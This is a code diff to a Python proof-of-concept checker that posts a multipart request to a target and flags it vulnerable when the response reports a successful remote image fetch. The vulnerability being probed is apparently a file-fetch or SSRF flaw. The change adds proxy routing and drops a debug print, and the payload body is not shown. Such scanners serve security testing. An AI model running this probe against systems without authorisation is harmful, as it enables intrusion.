@@ -2,11 +2,10 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
+from Config.config_proxies import proxies
 from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -33,9 +32,8 @@ def poc(targrt):
         "Content-Type": "multipart/form-data; boundary=---------------------------245629485030790359921083390342",
         "Connection": "close"
     }
-    res = requests.post(url, headers=headers, data=content, timeout=5, verify=False)
+    res = requests.post(url, headers=headers, data=content, timeout=5, verify=False,proxies=proxies)
     res = res.text
-    print(res)
     if "srcUrl" in res and "远程图片抓取成功" in res:
         result['message'] = res
         result['target_url'] = url
